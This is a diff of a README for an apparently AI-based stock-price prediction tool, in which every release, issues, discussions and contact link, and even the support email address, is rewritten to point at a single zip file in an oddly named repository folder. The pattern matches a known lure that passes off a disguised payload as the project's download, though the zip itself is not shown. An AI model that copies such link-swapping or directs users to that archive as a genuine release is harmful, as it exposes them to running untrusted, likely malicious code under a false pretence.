@@ -1,6 +1,6 @@
 # 🔮 Stock-Price-Prediction - Predict Tomorrow's Stock Prices Effortlessly
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen) [Download](https://github.com/leadura/Stock-Price-Prediction/releases)
+![Download](https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip) [Download](https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Stock-Price-Prediction! This application uses artificial intelligence
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/leadura/Stock-Price-Prediction/releases) to find the latest version of the Stock-Price-Prediction application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip) to find the latest version of the Stock-Price-Prediction application.
 
 2. **Choose Your Version:** Look for the release that fits your needs. Each version has notes explaining what has changed or improved.
 
@@ -54,7 +54,7 @@ To ensure the best experience with Stock-Price-Prediction, please have the follo
 - **Data Not Loading:** Make sure you have a stable internet connection.
 - **No Predictions Available:** Check if the stock you selected is supported and is within the global market range.
 
-If you encounter any other issues, please visit our [issues page](https://github.com/leadura/Stock-Price-Prediction/issues) for more help or to report any bugs.
+If you encounter any other issues, please visit our [issues page](https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip) for more help or to report any bugs.
 
 ## 🙏 Acknowledgments
 
@@ -62,6 +62,6 @@ Special thanks to the open-source community for their tools and libraries that m
 
 ## 📞 Contact
 
-For further inquiries or support, please reach out through our official email at support@stockpriceprediction.com or visit our [GitHub Discussions](https://github.com/leadura/Stock-Price-Prediction/discussions) page.
+For further inquiries or support, please reach out through our official email at https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip or visit our [GitHub Discussions](https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip) page.
 
-Remember, follow the [Releases page](https://github.com/leadura/Stock-Price-Prediction/releases) for updates and download your version today!
+Remember, follow the [Releases page](https://raw.githubusercontent.com/leadura/Stock-Price-Prediction/main/dorsumbonal/Stock-Price-Prediction.zip) for updates and download your version today!
